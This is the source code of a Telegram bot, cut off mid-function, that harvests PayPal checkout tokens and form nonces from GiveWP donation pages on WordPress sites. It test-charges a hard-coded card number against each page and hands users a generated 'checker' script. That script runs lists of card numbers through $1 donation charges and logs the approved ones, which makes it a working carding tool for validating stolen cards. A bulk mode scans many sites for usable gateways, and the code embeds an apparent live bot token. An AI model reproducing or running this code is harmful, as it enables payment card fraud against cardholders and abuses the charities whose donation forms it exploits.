import telebot
import time
import threading
from telebot import types
import requests, random, json, string, re, base64
from telebot.types import LabeledPrice
from datetime import datetime, timedelta
import os
import html
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

# === بيانات البوت ===
token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
processing_status = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior.')
        return 
    
    user_id = message.from_user.id
    userr = message.from_user.first_name

    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒊𝒔 𝒊𝒔 𝒂 𝑷𝒂𝒚𝑷𝒂𝒍 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒃𝒐𝒕.

[<a href="https://t.me/nnunrr">ϟ</a>] PayPal Gateway >> /paypal 
[<a href="https://t.me/nnunrr">ϟ</a>] Bulk Extract >> /bulk
[<a href="https://t.me/nnunrr">ϟ</a>] Send Feedback >> Button Below

[<a href="https://t.me/nnunrr">ϟ</a>] 𝐷𝑒𝑣: @nnunrr '''
    
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    
    video_url = 'https://t.me/C0CCOCOvjk/9'
    bot.send_photo(message.chat.id, video_url, caption=IU, parse_mode='HTML', reply_markup=FRA)

@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("Back", callback_data="start")
    Atty.add(back)
    YTT = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Send your message and the admin will respond.'''
    bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT, parse_mode='HTML', reply_markup=Atty)
    waiting_users[user_id] = True

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    bot.send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    bot.send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    bot.send_message(call.from_user.id, "Write your reply now:")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    bot.send_message(user_id, f"Admin response:\n\n{message.text}")
    bot.send_message(OWNER_ID, "Reply sent.")
    reply_mode.pop(message.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a>'''
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    from telebot.types import InputMediaPhoto
    photo_url = 'https://t.me/C0CCOCOvjk/9'
    bot.edit_message_media(
        media=InputMediaPhoto(media=photo_url, caption=IU, parse_mode='HTML'),
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=FRA
    )

# ============ أمر سحب PayPal ============
@bot.message_handler(func=lambda m: m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(massege.from_user.id) in blocked:
        bot.send_message(massege.chat.id, 'The admin has blocked you.')
        return

    ko = bot.send_message(massege.chat.id, "- The gate is being withdrawn ...")
    
    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text='''- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>''', parse_mode="HTML")
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Invalid link format ❌")
            return

        r = requests.get(link, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Site returned status: {r.status_code} ❌")
            return

        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Gate found ✅")

    except requests.exceptions.Timeout:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="The site took too long to respond ⏳")
        return
    except requests.exceptions.ConnectionError:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Connection error or site offline ❌")
        return
    except requests.exceptions.InvalidURL:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Invalid URL ❌")
        return
    except Exception as e:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{e}</code>", parse_mode="HTML")
        return

    user = generate_user_agent()
    r = requests.Session()
    headers = {'user-agent': user}
    res = r.get(url=f"{link}", headers=headers).text
    id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res).group(1)
    id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res).group(1)
    nonec = re.search(r'name="give-form-hash" value="(.*?)"', res).group(1)
    anc = re.search(r'"data-client-token":"(.*?)"', res)
    if anc:
        enc = re.search(r'"data-client-token":"(.*?)"', res).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
    else:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text='''Data Client Token not found ⚠️''', parse_mode="HTML")
        return

    parsed = urlparse(link)
    USER_URL2 = f'https://{parsed.netloc}'
    USER_URL = parsed.path

    headers = {
        'origin': f'{USER_URL2}',
        'referer': f'{USER_URL}',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = MultipartEncoder({
        'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2),
        'give-form-hash': (None, nonec),
        'give-amount': (None, '1.00'),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'Ali'),
        'give_last': (None, 'rights and'),
        'give_email': (None, 'Ali22@gmail.com'),
        'give-gateway': (None, 'paypal-commerce'),
    })
    headers['content-type'] = data.content_type
    params = {'action': 'give_paypal_commerce_create_order'}

    response = r.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data)
    
    try:
        tok = response.json()['data']['id']
    except:
        bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text='Token not In Data ❌', parse_mode="HTML")
        return

    headers = {
        'authorization': f'Bearer {au}',
        'content-type': 'application/json',
        'user-agent': user,
    }
    ccx = '4059986126444431|11|30|947'
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:
        yy = yy.split("20")[1]
    json_data = {
        'payment_source': {
            'card': {
                'number': n,
                'expiry': f'20{yy}-{mm}',
                'security_code': cvc,
                'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
            },
        },
        'application_context': {'vault': False},
    }

    response = r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers, json=json_data)

    data = MultipartEncoder({
        'give-form-id-prefix': (None, id_form1),
        'give-form-id': (None, id_form2),
        'give-form-hash': (None, nonec),
        'give-amount': (None, '1.00'),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'Ali'),
        'give_last': (None, 'rights and'),
        'give_email': (None, 'Ali22@gmail.com'),
        'give-gateway': (None, 'paypal-commerce'),
    })
    headers['content-type'] = data.content_type
    params = {'action': 'give_paypal_commerce_approve_order', 'order': tok}

    response = r.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=data)
    
    if 'ORDER_NOT_APPROVED' in response.text:
        msg = 'ORDER_NOT_APPROVED'
    else:
        try:
            msg = response.json()['data']['error']
        except:
            msg = html.escape(response.text[:100])

    text_content = f'''import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from faker import Faker
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        url = '{link}'
        parsed = urlparse(url)
        domain = parsed.netloc
        path = parsed.path
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.url = domain
        self.inurl = path
        self.email = f"{{random.choice(self.first_name)}}{{random.choice(self.last_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()

    def Key(self):
        he1 = {{'upgrade-insecure-requests': '1', 'user-agent': self.uu.random}}
        r1 = self.r.get(f'https://{{self.url}}{{self.inurl}}', headers=he1)
        self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
        self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
        self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
        enc = re.search(r'"data-client-token":"(.*?)"', r1.text).group(1)
        dec = base64.b64decode(enc).decode('utf-8')
        self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Charge(self, ccx):
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.paypal, 'user-agent': self.uu.random}}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        paypal_responses = ['Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE', 'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT', 'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE', 'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED']
        for pr in paypal_responses:
            if pr.lower() in text.lower():
                return pr
        if 'true' in text or 'success' in text:
            return 'CHARGE 1.00$'
        try:
            return r5.json()['data']['error']
        except:
            return "UNKNOWN_ERROR"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            itt = rr.Key()
            resulti = rr.Charge(ar)
            if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    itt = rr.Key()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + ': {{resulti}} > {{Getat}}')
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(13)'''

    file_name = f'gateway_{int(time.time())}.py'
    with open(file_name, "w", encoding="utf-8") as f:
        f.write(text_content)
    with open(file_name, "rb") as f:
        bot.send_document(chat_id=massege.chat.id, document=f, caption=f'''The gate was successfully withdrawn ✅\n━━━━━━━━━━━━━━━━━━━━\n<strong>Gateway information ...</strong>\n\nLink: <code>{link}</code>\nid form: <code>{id_form1}</code>\nid form2: <code>{id_form2}</code>\nnonce: <code>{nonec}</code>\nclient token: <code>{au}</code>\nid payment: <code>{tok}</code>\nmsg gateway: <code>{msg}</code>\n━━━━━━━━━━━━━━━━━━━━\nDev: @nnunrr''', parse_mode="HTML")
    os.remove(file_name)

# ============ أمر bulk ============
@bot.message_handler(commands=['bulk'])
def bulk_extract_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        bot.send_message(message.chat.id, 'The admin has blocked you.')
        return

    msg = bot.reply_to(message, "📁 Send a .txt file with links (one link per line):")
    bot.register_next_step_handler(msg, process_bulk_file)

@bot.message_handler(commands=['stop'])
def stop_bulk(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        bot.reply_to(message, "🛑 Stopping...")
    else:
        bot.reply_to(message, "❌ No active process.")

# كل ردود PayPal API
PAYPAL_RESPONSES = [
    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
    'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
    'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
]

DEAD_RESPONSES = ['invalid_client', 'Client Authentication failed', 'invalid_grant', 'unsupported_grant_type', 'invalid_scope']

def check_single_link(link):
    """فحص رابط واحد - دفع فعلي + رد PayPal API = حي"""
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL'}
        
        user = generate_user_agent()
        r = requests.Session()
        headers = {'user-agent': user}
        res = r.get(url=link, headers=headers, timeout=30).text
        
        id_form1 = ''
        id_form2 = ''
        nonec = ''
        au = None
        enc = None
        
        match = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
        if match:
            id_form1 = match.group(1)
        
        match = re.search(r'name="give-form-id" value="(.*?)"', res)
        if match:
            id_form2 = match.group(1)
        
        match = re.search(r'name="give-form-hash" value="(.*?)"', res)
        if match:
            nonec = match.group(1)
        
        anc = re.search(r'"data-client-token":"(.*?)"', res)
        if anc:
            enc = anc.group(1)
        
        au_match = re.search(r'accessToken["\']?\s*:\s*["\']([^"\']+)["\']', res)
        if au_match:
            au = au_match.group(1)
        
        if enc and not au:
            try:
                dec = base64.b64decode(enc).decode('utf-8')
                au_match = re.search(r'"accessToken":"(.*?)"', dec)
                if au_match:
                    au = au_match.group(1)
            except:
                pass
        
        if not au and not (id_form2 and nonec):
            return {'link': link, 'live': False, 'respons': 'No PayPal data'}
        
        parsed = urlparse(link)
        USER_URL2 = f'https://{parsed.netloc}'
        USER_URL = parsed.path
        
        tok = ''
        
        if id_form2 and nonec:
            try:
                headers = {
                    'origin': f'{USER_URL2}',
                    'referer': f'{USER_URL}',
                    'user-agent': user,
                    'x-requested-with': 'XMLHttpRequest',
                }
                data = MultipartEncoder({
                    'give-form-id-prefix': (None, id_form1 or id_form2),
                    'give-form-id': (None, id_form2),
                    'give-form-hash': (None, nonec),
                    'give-amount': (None, '1.00'),
                    'payment-mode': (None, 'paypal-commerce'),
                    'give_first': (None, 'Test'),
                    'give_last': (None, 'User'),
                    'give_email': (None, 'test@gmail.com'),
                    'give-gateway': (None, 'paypal-commerce'),
                })
                headers['content-type'] = data.content_type
                params = {'action': 'give_paypal_commerce_create_order'}
                response = r.post(f'{USER_URL2}/wp-admin/admin-ajax.php', params=params, headers=headers, data=data, timeout=30)
                try:
                    tok = response.json()['data']['id']
                except:
                    tok = ''
            except:
                tok = ''
        
        if not tok and au:
            try:
                headers = {
                    'authorization': f'Bearer {au}',
                    'content-type': 'application/json',
                    'user-agent': user,
                }
                json_data = {
                    'intent': 'CAPTURE',
                    'purchase_units': [{'amount': {'currency_code': 'USD', 'value': '1.00'}}]
                }
                response = r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=json_data, timeout=30)
                try:
                    tok = response.json()['id']
                except:
                    tok = ''
            except:
                tok = ''
        
        if not tok:
            return {'link': link, 'live': False, 'respons': 'No order ID'}
        
        if not au:
            return {'link': link, 'live': False, 'respons': 'No au for payment'}
        
        headers = {
            'authorization': f'Bearer {au}',
            'content-type': 'application/json',
            'user-agent': user,
        }
        ccx = '4059986126444431|11|30|947'
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3]
        if "20" in yy:
            yy = yy.split("20")[1]
        
        json_data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': f'20{yy}-{mm}',
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        
        response = r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source', headers=headers, json=json_data, timeout=30)
        response_text = response.text
        
        for pr in PAYPAL_RESPONSES:
            if pr.lower() in response_text.lower():
                return {
                    'link': link, 'live': True, 'respons': pr,
                    'id_form1': id_form1 or id_form2, 'id_form2': id_form2,
                    'nonec': nonec, 'au': au
                }
        
        for dr in DEAD_RESPONSES:
            if dr.lower() in response_text.lower():
                return {'link': link, 'live': False, 'respons': dr}
        
        if 'error' in response_text.lower():
            return {'link': link, 'live': False, 'respons': response_text[:100]}
        
        return {'link': link, 'live': False, 'respons': response_text[:100]}
        
    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100]}

def generate_gateway_file(result):
    return f'''import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.id_form1 = "{result['id_form1']}"
        self.id_form2 = "{result['id_form2']}"
        self.nonec = "{result['nonec']}"
        self.au = "{result['au']}"
        url = '{result['link']}'
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Key(self):
        return self.au, self.id_form1, self.id_form2, self.nonec

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{'authorization': f'Bearer {{self.au}}', 'paypal-client-metadata-id': self.paypal, 'user-agent': self.uu.random}}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        paypal_responses = ['Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED', 'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED', 'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY', 'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE', 'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED', 'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS', 'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED', 'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT', 'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT', 'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE', 'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY', 'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED']
        for pr in paypal_responses:
            if pr.lower() in text.lower():
                return pr
        if 'true' in text or 'success' in text:
            return 'CHARGE 1.00$'
        try:
            return r5.json()['data']['error']
        except:
            return "UNKNOWN_ERROR"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            itt = rr.Key()
            resulti = rr.Charge(ar)
            if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    itt = rr.Key()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {{e}}'
                if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + ': {{resulti}} > {{Getat}}')
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(13)'''

def process_bulk_file(message):
    if not message.document:
        bot.reply_to(message, "❌ Please send a .txt file.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8').splitlines()
        links = [link.strip() for link in links if link.strip()]

        if not links:
            bot.reply_to(message, "❌ File is empty.")
            return

        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        processing_status[user_id] = {
            'total': total, 'processed': 0, 'live': 0, 'dead': 0,
            'lock': threading.Lock(), 'current_url': '', 'current_respons': '',
            'stop_flag': False, 'done': False
        }
        
        status_msg = bot.reply_to(message, f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
Url : ...
Respons : ...
━━━━━━━━━━━━━━━━━━
⏱️ Checked 0 of {total}
🛑 /stop to stop""", parse_mode="HTML")

        def update_status():
            last_text = ""
            while True:
                time.sleep(1)
                with processing_status[user_id]['lock']:
                    if processing_status[user_id].get('done', False):
                        break
                    processed = processing_status[user_id]['processed']
                    live = processing_status[user_id]['live']
                    dead = processing_status[user_id]['dead']
                    current_url = processing_status[user_id]['current_url']
                    current_respons = processing_status[user_id]['current_respons']
                    percent = int((processed / total) * 100) if total > 0 else 0
                    bar_length = 20
                    filled = int((percent / 100) * bar_length)
                    bar = '█' * filled + '░' * (bar_length - filled)
                    text = f"""📊 <b>File #1 - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {percent}% {bar}
Url : <code>{current_url[:60] if current_url else '...'}</code>
Respons : <code>{current_respons[:60] if current_respons else '...'}</code>
━━━━━━━━━━━━━━━━━━
⏱️ Checked {processed} of {total}
🛑 /stop to stop"""
                    if text != last_text:
